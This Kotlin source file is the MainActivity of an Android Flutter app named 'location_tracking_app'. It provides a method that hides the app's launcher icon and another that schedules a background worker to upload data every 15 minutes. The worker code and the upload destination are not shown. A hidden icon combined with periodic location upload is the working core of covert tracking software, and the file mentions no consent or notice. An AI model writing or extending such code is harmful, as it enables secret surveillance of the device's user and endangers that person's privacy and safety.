package com.example.location_tracking_app

import android.content.ComponentName
import android.content.pm.PackageManager
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import java.util.concurrent.TimeUnit

class MainActivity : FlutterActivity() {
    // Keep the launcher channel for the hide icon feature
    private val LAUNCHER_CHANNEL = "com.example.location_tracking_app/launcher"
    // Add a new channel for background tasks
    private val BACKGROUND_CHANNEL = "com.example.location_tracking_app/background"

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        // Handler for hiding the icon
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, LAUNCHER_CHANNEL).setMethodCallHandler { call, result ->
            if (call.method == "hideLauncherIcon") {
                hideLauncherIcon()
                result.success(null)
            } else {
                result.notImplemented()
            }
        }

        // Handler for starting/stopping the background worker
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, BACKGROUND_CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "startPeriodicDataUpload" -> {
                    startPeriodicWorker()
                    result.success("Periodic work started")
                }
                "stopPeriodicDataUpload" -> {
                    stopPeriodicWorker()
                    result.success("Periodic work stopped")
                }
                else -> {
                    result.notImplemented()
                }
            }
        }
    }

    private fun startPeriodicWorker() {
        // IMPORTANT: PeriodicWorkRequest has a minimum repeat interval of 15 minutes.
        val dataUploadWorkRequest = PeriodicWorkRequestBuilder<DataUploadWorker>(15, TimeUnit.MINUTES)
            .build()

        WorkManager.getInstance(applicationContext).enqueueUniquePeriodicWork(
            DataUploadWorker.WORK_NAME,
            ExistingPeriodicWorkPolicy.KEEP, // Keep the existing work if it's already scheduled
            dataUploadWorkRequest
        )
    }

    private fun stopPeriodicWorker() {
        WorkManager.getInstance(applicationContext).cancelUniqueWork(DataUploadWorker.WORK_NAME)
    }

    private fun hideLauncherIcon() {
        val pm: PackageManager = packageManager
        val componentName = ComponentName(this, MainActivity::class.java)
        pm.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}
